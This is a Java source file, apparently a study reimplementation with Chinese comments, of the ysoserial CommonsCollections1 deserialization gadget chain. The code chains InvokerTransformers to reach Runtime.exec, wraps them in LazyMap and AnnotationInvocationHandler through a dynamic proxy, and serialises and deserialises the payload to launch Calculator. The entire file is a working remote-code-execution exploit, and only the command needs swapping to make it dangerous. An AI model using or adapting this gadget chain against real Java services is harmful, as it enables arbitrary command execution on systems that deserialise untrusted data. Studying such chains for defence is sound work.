import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @author yhy
 * @date 2021/6/10 23:00
 * @github https://github.com/yhy0
 */

// ysoserial
public class CC1Yso {
    public static void main(String[] args) throws Exception {
        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                        new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        new Object[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),

        };
        //将transformers数组存入ChaniedTransformer这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();

        // 不用再添加value了
        // innerMap.put("value", "value");
        //使用 LazyMap
        Map outerMap = LazyMap.decorate(innerMap,transformerChain);

        // 通过反射机制 实例化 AnnotationInvocationHandler
        Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
        //取消构造函数修饰符限制
        ctor.setAccessible(true);
        //获取AnnotationInvocationHandler类实例
        Object instance = ctor.newInstance(Target.class, outerMap);

        // 动态代理劫持 （Proxy 实现了Serializable接口 是可以序列化的）
        InvocationHandler handler = (InvocationHandler) instance;
        Map proxyMap = (Map) Proxy.newProxyInstance(
                Map.class.getClassLoader(),
                new Class[] {Map.class},
                handler
        );

        Object proxy =  ctor.newInstance(Target.class, proxyMap);

        //payload序列化写入文件，模拟网络传输
        FileOutputStream f = new FileOutputStream("payloadproxy.bin");
        ObjectOutputStream fout = new ObjectOutputStream(f);
        fout.writeObject(proxy);

        //2.服务端读取文件，反序列化，模拟网络传输
        FileInputStream fi = new FileInputStream("payloadproxy.bin");
        ObjectInputStream fin = new ObjectInputStream(fi);
        //服务端反序列化
        fin.readObject();


    }
}
